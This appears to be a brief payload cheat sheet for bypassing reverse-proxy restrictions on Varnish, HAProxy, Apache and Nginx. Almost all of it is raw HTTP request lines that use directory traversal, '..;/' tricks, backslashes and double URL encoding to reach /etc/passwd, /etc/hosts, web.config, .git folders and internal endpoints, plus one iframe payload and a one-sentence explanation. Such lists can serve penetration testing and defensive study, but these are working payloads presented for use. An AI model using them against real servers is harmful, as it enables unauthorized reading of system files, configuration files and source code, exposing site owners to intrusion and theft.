# proxiesVulns bypass

Varnish or HaProxy

1. GET http://company.com/Endpoints-To-Proxy/.git HTTP/1.1
2. GeT /Endpoint-To-Proxy/../../../../../../etc/passwd HTTP/1.1
3. GET /Endpoint-To-Proxy/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1

Apache

1. GET /Endpoint-To-Proxy/.git%3FAllowed HTTP/1.1
2. GET /Endpoint-To-Proxy/../../../../../../../etc/passwd HTTP/1.1
3. GET /Endpoint-To-Proxy/../../../../../../etc//./passwd HTTP/1.1
4. GET /Endpoint-To-Proxy/..//../../../../../../etc/passwd HTTP/1.1
5. GET /Endpoint-To-Proxy/..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
6. GET /Endpoint-To-Proxy\..\.\..\.\..\.\..\.\Internal-Endpoint%3F.js HTTP/1.1
7. GET /Endpoint-To-Proxy\..\.\..\.\..\.\..\.\Internal-Endpoint HTTP/1.1
8. GET /Endpoint-To-Proxy/file:%2f%2f/Internal-Endpoint/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1
9. GET /Endpoint-To-Proxy/%255c%255c%255c%255c%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c/Internal-Endpoint HTTP/1.1
10. GET /Endpoint-To-Proxy/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/# HTTP/1.1
11. GET /Endpoint-To-Proxy//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts HTTP/1.1


Nginx

1. GET /..;/..;/..;/..;/web.config HTTP/1.1
2. GET /Endpoint-To-Proxy/..;/../../../../../../etc/passwd HTTP/1.1
3. GET /Endpoint-To-Proxy/../../../../../../../etc/passwd//../ HTTP/1.1
4. GET /Endpoint-To-Proxy/#/../../../../../../../../../../etc/passwd HTTP/1.1
5. GET /Endpoint-To-Proxy../../../../../../../etc/passwd HTTP/1.1
6. GET /../../../../etc/passwd/..;/Endpoint-To-Proxy HTTP/1.1
7. GET /../../../../../../../etc/passwd;/../Endpoint-To-Proxy HTTP/1.1
8. GET /Endpoint-To-Proxy;/../../../../etc/passwd HTTP/1.1
9. GET /Endpoint-To-Proxy/../../../../etc/passwd%2f%2f%2f HTTP/1.1

10. <iframe src="https://www.company.com/Endpoint-To-Proxy/..;/Endpoint-To-Iframe">

By including "..;/", it may be possible to trick the server into thinking that the request is for a different endpoint than the one that is actually being requested

Nginx vs HAProxy (https://klink0v.livejournal.com/692218.html)
